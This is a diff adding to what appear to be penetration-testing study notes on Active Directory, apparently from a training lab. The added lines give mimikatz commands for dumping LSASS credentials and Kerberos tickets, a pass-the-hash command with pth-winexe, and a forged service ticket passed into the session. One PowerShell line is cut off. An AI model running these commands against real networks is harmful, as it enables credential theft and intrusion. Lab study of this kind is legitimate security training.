@@ -141,19 +141,69 @@ Returns an internal IP address which also happens to be the Domain Controller. W
 
 ### Cached Credential Storage and Retrieval
 
+Stored in the Local Security Authority Subsystem Service (LSASS)
+
+```powershell
+# May need elevated privilges
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords  # dumps hashes for all logged on users current machine
+# Grab hashes
+```
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets  # Check for kerberos tickets stored in memory
+# Lookg for Ticket Granting Service and Ticket Granting Ticket
+```
+
 ### Service Account Attacks
 
+```powershell
+# Using PowerShell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H
+```
+
+See other documented notes for remaining details.
+
 ### Low and Slow Password Guessing
+
+```powershell
+net accounts  # Check lockout threshhold and lockout observation window
+```
+
+See other documented notes for remaining details.
 
 ## Lateral Movement Techniques
 
 ### Pass the Hash
 
+```bash
+# From Kali
+pth-winexe -U <user>%<NTLM Hash> <IP> <command>
+pth-winexe -U offsec%<NTLM Hash> //10.11.0.22 cmd
+```
+
 ### Overpass the Hash
+
+See other documented notes for remaining details.
 
 ### Pass the Ticket
 
+```powershell
+whoami /user  # Grab the SID
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+mimikatz # kerberos::list
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+mimikatz # kerberos::list
+```
+
 ### Distributed Component Object Model
+
+See other documented notes for remaining details.
 
 ## Persistence
 
